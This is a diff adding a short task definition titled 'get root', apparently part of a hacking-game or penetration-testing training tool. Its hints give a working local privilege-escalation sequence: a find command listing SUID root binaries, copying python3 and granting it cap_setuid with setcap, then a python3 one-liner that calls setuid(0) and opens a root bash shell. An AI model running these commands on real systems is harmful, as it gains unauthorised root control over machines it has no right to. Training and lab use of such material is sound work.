@@ -1,0 +1,11 @@
+description: get root
+function: magic_function
+argument: []
+In: []
+condition: 
+Out: []
+hint:
+  - Please enter `find / -user root -perm -4000 -exec ls -ldb {{}} \; | grep root` in shell you got.
+  - Do you see "setcap"? (Y/n)
+  - First enter `cp /usr/bin/python3 .`, then enter `setcap cap_setuid+ep python3` to modify permission.
+  - Enter `./python3 -c "import os;os.setuid(0);os.system('/bin/bash')"` to get root.
